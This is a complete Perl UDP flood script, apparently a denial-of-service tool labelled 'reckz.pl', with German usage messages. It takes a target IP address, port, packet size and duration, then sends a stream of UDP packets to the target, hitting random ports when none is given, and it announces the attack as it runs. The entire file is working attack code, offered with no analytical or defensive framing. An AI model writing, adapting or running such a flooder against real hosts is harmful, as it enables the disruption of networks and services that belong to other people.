#!/usr/bin/perl

use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "reckz.pl <IP> <Ports> <Packete> <Zeit>\n\n";
  print " port=0: Zufall Ports\n";
  print " size=0: Zufall Packete Zwischen 64 und 65500\n";
  print " time=0: Zeit des Angriffes\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "C1D3 Attackiert $ip " . ($port ? $port : "random") . " port with " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize",""), 0, pack_sockaddr_in($pport, $iaddr));}
